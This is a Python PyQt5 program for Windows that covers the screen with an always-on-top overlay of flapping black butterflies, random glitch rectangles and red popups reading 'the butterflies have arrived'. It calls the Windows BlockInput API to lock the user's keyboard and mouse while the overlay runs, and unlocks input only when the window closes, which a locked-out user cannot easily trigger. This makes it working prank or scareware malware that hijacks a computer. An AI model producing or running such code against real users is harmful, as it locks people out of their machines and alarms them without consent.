import sys
import random
import math
import ctypes
from PyQt5.QtCore import Qt, QTimer, QPoint, QRect
from PyQt5.QtGui import QPainter, QColor, QPen, QBrush, QFont, QPolygonF
from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout

# Request administrative privileges / lock input capability
user32 = ctypes.windll.user32

class BlackButterfly:
    def __init__(self, screen_width, screen_height):
        self.sw = screen_width
        self.sh = screen_height
        self.x = random.randint(100, self.sw - 100)
        self.y = random.randint(100, self.sh - 100)
        self.vx = random.choice([-6, -4, 4, 6])
        self.vy = random.choice([-6, -4, 4, 6])
        self.wing_angle = 0.0
        self.wing_speed = 0.3

    def update(self):
        self.x += self.vx + random.uniform(-2, 2)
        self.y += self.vy + random.uniform(-2, 2)
        
        # Bounce off screen edges
        if self.x < 0 or self.x > self.sw - 50:
            self.vx *= -1
        if self.y < 0 or self.y > self.sh - 50:
            self.vy *= -1
            
        self.wing_angle += self.wing_speed

    def draw(self, painter):
        painter.save()
        painter.translate(self.x, self.y)
        
        # Wing flap scaling factor based on sine wave
        flap = math.sin(self.wing_angle)
        
        # Black butterfly wings polygon
        painter.setBrush(QBrush(QColor(10, 10, 10, 240)))
        painter.setPen(QPen(QColor(50, 50, 50), 1))
        
        # Left wing
        left_wing = QPolygonF([
            QPoint(0, 0),
            QPoint(int(-30 * abs(flap)), -25),
            QPoint(int(-40 * abs(flap)), 20),
            QPoint(0, 30)
        ])
        
        # Right wing
        right_wing = QPolygonF([
            QPoint(0, 0),
            QPoint(int(30 * abs(flap)), -25),
            QPoint(int(40 * abs(flap)), 20),
            QPoint(0, 30)
        ])
        
        painter.drawPolygon(left_wing)
        painter.drawPolygon(right_wing)
        
        # Body
        painter.setBrush(QBrush(QColor(0, 0, 0)))
        painter.drawEllipse(-3, -20, 6, 40)
        
        painter.restore()

class ButterflyChaosOverlay(QWidget):
    def __init__(self):
        super().__init__()
        
        # Screen geometry
        screen = QApplication.primaryScreen().geometry()
        self.sw = screen.width()
        self.sh = screen.height()
        
        self.initUI()
        
        # Lock input using Windows API
        try:
            user32.BlockInput(True)
        except Exception:
            pass

    def initUI(self):
        self.setWindowFlags(
            Qt.FramelessWindowHint | 
            Qt.WindowStaysOnTopHint | 
            Qt.Tool
        )
        self.setAttribute(Qt.WA_TranslucentBackground, True)
        self.setGeometry(0, 0, self.sw, self.sh)
        
        # Butterflies list
        self.butterflies = [BlackButterfly(self.sw, self.sh) for _ in range(12)]
        
        # Popups container
        self.popups = []
        
        # Timers for glitching and animation
        self.anim_timer = QTimer(self)
        self.anim_timer.timeout.connect(self.update_chaos)
        self.anim_timer.start(16) # ~60 FPS
        
        self.popup_timer = QTimer(self)
        self.popup_timer.timeout.connect(self.spawn_popup)
        self.popup_timer.start(400)

        self.showFullScreen()

    def update_chaos(self):
        for b in self.butterflies:
            b.update()
        self.update()

    def spawn_popup(self):
        if len(self.popups) < 15:
            popup = ChaosPopup(
                random.randint(100, self.sw - 300),
                random.randint(100, self.sh - 150)
            )
            self.popups.append(popup)
            popup.show()

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        
        # Screen glitch artifacts (random colored tearing rectangles)
        if random.random() < 0.4:
            for _ in range(random.randint(3, 10)):
                rx = random.randint(0, self.sw)
                ry = random.randint(0, self.sh)
                rw = random.randint(50, 400)
                rh = random.randint(5, 40)
                glitch_color = random.choice([
                    QColor(0, 0, 0, 200),
                    QColor(255, 0, 0, 100),
                    QColor(0, 255, 0, 80),
                    QColor(20, 20, 20, 220)
                ])
                painter.fillRect(rx, ry, rw, rh, glitch_color)

        # Draw all black butterflies
        for b in self.butterflies:
            b.draw(painter)

    def closeEvent(self, event):
        # Restore input on exit attempt
        try:
            user32.BlockInput(False)
        except Exception:
            pass
        event.accept()

class ChaosPopup(QWidget):
    def __init__(self, x, y):
        super().__init__()
        self.setGeometry(x, y, 320, 120)
        self.setWindowFlags(
            Qt.FramelessWindowHint | 
            Qt.WindowStaysOnTopHint | 
            Qt.Tool
        )
        self.setAttribute(Qt.WA_TranslucentBackground, True)
        
        layout = QVBoxLayout()
        self.label = QLabel("the butterflies have arrived")
        self.label.setStyleSheet(
            "color: #ff0000; font-family: 'Courier New'; font-size: 18px; "
            "font-weight: bold; background-color: rgba(0, 0, 0, 220); "
            "border: 2px solid #ff0000; padding: 20px;"
        )
        self.label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.label)
        self.setLayout(layout)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    overlay = ButterflyChaosOverlay()
    sys.exit(app.exec_())
